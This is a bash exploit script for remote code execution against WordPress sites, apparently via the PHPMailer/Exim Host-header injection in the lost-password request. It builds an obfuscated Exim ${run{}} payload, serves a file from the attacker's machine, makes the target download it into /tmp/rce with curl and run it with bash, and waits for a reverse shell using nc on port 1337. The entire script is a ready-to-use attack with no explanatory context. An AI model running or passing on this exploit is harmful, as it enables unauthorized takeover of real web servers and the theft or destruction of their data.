#!/bin/bash

if [ "$#" -lt 1 ]; then
  echo -e "Usage:\n$0 target-wordpress-url reverse-host\n"
  exit 1
fi
if [ "x$1" != "x" ]; then target="$1"; else exit 1; fi
if [ "x$2" != "x" ]; then rev_host="$2"; fi

function prep_host_header() {
      cmd="$1"
      rce_cmd="\${run{$cmd}}";

      # replace / with ${substr{0}{1}{$spool_directory}}
      # sed 's^/^${substr{0}{1}{$spool_directory}}^g'
      rce_cmd="$(echo $rce_cmd | sed 's^/^\${substr{0}{1}{\$spool_directory}}^g')"

      # replace ' ' (space) with
      # sed 's^ ^${substr{10}{1}{$tod_log}}$^g'
      rce_cmd="$(echo $rce_cmd | sed 's^ ^\${substr{10}{1}{\$tod_log}}^g')"
      # return "target(any -froot@localhost -be $rce_cmd null)"
      host_header="target(any -froot@localhost -be $rce_cmd null)"
      return 0
}


# Serve payload/bash script on :80
python3 -m http.server 80 &
sleep 3

# Save payload on the target in /tmp/rce
cmd="/usr/bin/curl -o/tmp/rce $rev_host/rce.txt"
prep_host_header "$cmd"
curl -H"Host: $host_header" -s -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword"
sleep 3

# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce
cmd="/bin/bash /tmp/rce"
prep_host_header "$cmd"

echo 'if not coming, then ctrl c'
for i in {1..5..1}; do
curl -H"Host: $host_header" -d 'user_login=admin&wp-submit=Get+New+Password' "$target/wp-login.php?action=lostpassword" &
nc -lvnp 1337;
done

echo "to kill python server: 'ps aux | grep python' and then 'kill -9 <pid>'"

